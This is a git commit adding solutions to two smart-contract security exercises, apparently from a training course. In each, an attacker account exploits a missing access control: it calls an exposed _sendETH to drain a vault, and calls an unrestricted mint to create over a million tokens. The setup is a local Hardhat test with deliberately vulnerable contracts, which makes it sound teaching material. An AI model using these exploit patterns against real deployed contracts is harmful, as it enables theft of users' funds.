8900cd5ead3ced8fab7987f3ae23e8bdc8711f36
firatstory.eth <talefirat@gmail.com>
2023-06-12 10:14:43 +0200

    implement access-control 1-2 solutions

--- test/access-control-1/tests.ts
+++ test/access-control-1/tests.ts
@@ -1,71 +1,64 @@
-import { ethers } from "hardhat";
-import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
-import { BigNumber } from "ethers";
-import { expect } from "chai";
-import { ProtocolVault, ProtocolVault__factory } from "../../typechain-types";
+import { ethers } from 'hardhat';
+import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
+import { BigNumber } from 'ethers';
+import { expect } from 'chai';
+import { ProtocolVault, ProtocolVault__factory } from '../../typechain-types';
 
-describe("Access Control Exercise 1", function () {
-    let deployer: SignerWithAddress,
-        user1: SignerWithAddress,
-        user2: SignerWithAddress,
-        user3: SignerWithAddress,
-        attacker: SignerWithAddress;
+describe('Access Control Exercise 1', function () {
+	let deployer: SignerWithAddress,
+		user1: SignerWithAddress,
+		user2: SignerWithAddress,
+		user3: SignerWithAddress,
+		attacker: SignerWithAddress;
 
-    const USER_DEPOSIT = ethers.utils.parseEther("10");
+	const USER_DEPOSIT = ethers.utils.parseEther('10');
 
-    let protocolVault: ProtocolVault;
-    let attackerInitialETHBalance: BigNumber;
+	let protocolVault: ProtocolVault;
+	let attackerInitialETHBalance: BigNumber;
 
-    before(async function () {
-        /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */
+	before(async function () {
+		/** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */
 
-        [deployer, user1, user2, user3, attacker] = await ethers.getSigners();
+		[deployer, user1, user2, user3, attacker] = await ethers.getSigners();
 
-        attackerInitialETHBalance = await ethers.provider.getBalance(
-            attacker.address
-        );
+		attackerInitialETHBalance = await ethers.provider.getBalance(attacker.address);
 
-        const ProtocolVaultFactory = (await ethers.getContractFactory(
-            "contracts/access-control-1/ProtocolVault.sol:ProtocolVault",
-            deployer
-        )) as ProtocolVault__factory;
-        protocolVault = await ProtocolVaultFactory.deploy();
+		const ProtocolVaultFactory = (await ethers.getContractFactory(
+			'contracts/access-control-1/ProtocolVault.sol:ProtocolVault',
+			deployer
+		)) as ProtocolVault__factory;
+		protocolVault = await ProtocolVaultFactory.deploy();
 
-        await user1.sendTransaction({
-            to: protocolVault.address,
-            value: USER_DEPOSIT,
-        });
-        await user2.sendTransaction({
-            to: protocolVault.address,
-            value: USER_DEPOSIT,
-        });
-        await user3.sendTransaction({
-            to: protocolVault.address,
-            value: USER_DEPOSIT,
-        });
+		await user1.sendTransaction({
+			to: protocolVault.address,
+			value: USER_DEPOSIT,
+		});
+		await user2.sendTransaction({
+			to: protocolVault.address,
+			value: USER_DEPOSIT,
+		});
+		await user3.sendTransaction({
+			to: protocolVault.address,
+			value: USER_DEPOSIT,
+		});
 
-        let currentBalance = await ethers.provider.getBalance(
-            protocolVault.address
-        );
-        expect(currentBalance).to.be.equal(USER_DEPOSIT.mul(3));
-        expect(protocolVault.connect(attacker).withdrawETH()).to.be.reverted;
-    });
+		let currentBalance = await ethers.provider.getBalance(protocolVault.address);
+		expect(currentBalance).to.be.equal(USER_DEPOSIT.mul(3));
+		expect(protocolVault.connect(attacker).withdrawETH()).to.be.reverted;
+	});
 
-    it("Exploit", async function () {
-        /** CODE YOUR SOLUTION HERE */
-    });
+	it('Exploit', async function () {
+		/** CODE YOUR SOLUTION HERE */
+		protocolVault.connect(attacker)._sendETH(attacker.address);
+	});
 
-    after(async function () {
-        /** SUCCESS CONDITIONS */
+	after(async function () {
+		/** SUCCESS CONDITIONS */
 
-        // Protocol Vault is empty and attacker has ~30+ ETH
-        expect(
-            await ethers.provider.getBalance(protocolVault.address)
-        ).to.be.equal(0);
-        expect(await ethers.provider.getBalance(attacker.address)).to.be.gt(
-            attackerInitialETHBalance
-                .add(USER_DEPOSIT.mul(3))
-                .sub(ethers.utils.parseEther("0.2"))
-        );
-    });
+		// Protocol Vault is empty and attacker has ~30+ ETH
+		expect(await ethers.provider.getBalance(protocolVault.address)).to.be.equal(0);
+		expect(await ethers.provider.getBalance(attacker.address)).to.be.gt(
+			attackerInitialETHBalance.add(USER_DEPOSIT.mul(3)).sub(ethers.utils.parseEther('0.2'))
+		);
+	});
 });
--- test/access-control-2/tests.ts
+++ test/access-control-2/tests.ts
@@ -1,45 +1,42 @@
-import { ethers } from "hardhat";
-import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
-import { BigNumber } from "ethers";
-import { parseEther } from "ethers/lib/utils";
-import { expect } from "chai";
-import { ToTheMoon, ToTheMoon__factory } from "../../typechain-types";
+import { ethers } from 'hardhat';
+import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
+import { BigNumber } from 'ethers';
+import { parseEther } from 'ethers/lib/utils';
+import { expect } from 'chai';
+import { ToTheMoon, ToTheMoon__factory } from '../../typechain-types';
 
-describe("Access Control Exercise 2", function () {
-    let deployer: SignerWithAddress,
-        user1: SignerWithAddress,
-        attacker: SignerWithAddress;
+describe('Access Control Exercise 2', function () {
+	let deployer: SignerWithAddress, user1: SignerWithAddress, attacker: SignerWithAddress;
 
-    const INITIAL_MINT = parseEther("1000");
-    const USER_MINT = parseEther("10");
+	const INITIAL_MINT = parseEther('1000');
+	const USER_MINT = parseEther('10');
 
-    let toTheMoon: ToTheMoon;
+	let toTheMoon: ToTheMoon;
 
-    before(async function () {
-        /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */
+	before(async function () {
+		/** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */
 
-        [deployer, user1, attacker] = await ethers.getSigners();
+		[deployer, user1, attacker] = await ethers.getSigners();
 
-        const ToTheMoonFactory = (await ethers.getContractFactory(
-            "contracts/access-control-2/ToTheMoon.sol:ToTheMoon",
-            deployer
-        )) as ToTheMoon__factory;
+		const ToTheMoonFactory = (await ethers.getContractFactory(
+			'contracts/access-control-2/ToTheMoon.sol:ToTheMoon',
+			deployer
+		)) as ToTheMoon__factory;
 
-        toTheMoon = await ToTheMoonFactory.deploy(INITIAL_MINT);
+		toTheMoon = await ToTheMoonFactory.deploy(INITIAL_MINT);
 
-        await toTheMoon.mint(user1.address, USER_MINT);
-    });
+		await toTheMoon.mint(user1.address, USER_MINT);
+	});
 
-    it("Exploit", async function () {
-        /** CODE YOUR SOLUTION HERE */
-    });
+	it('Exploit', async function () {
+		/** CODE YOUR SOLUTION HERE */
+		await toTheMoon.connect(attacker).mint(attacker.address, USER_MINT.add(INITIAL_MINT).add(parseEther('1000000')));
+	});
 
-    after(async function () {
-        /** SUCCESS CONDITIONS */
+	after(async function () {
+		/** SUCCESS CONDITIONS */
 
-        // Attacker has 1 million tokens
-        expect(await toTheMoon.balanceOf(attacker.address)).to.be.gt(
-            parseEther("1000000")
-        );
-    });
+		// Attacker has 1 million tokens
+		expect(await toTheMoon.balanceOf(attacker.address)).to.be.gt(parseEther('1000000'));
+	});
 });
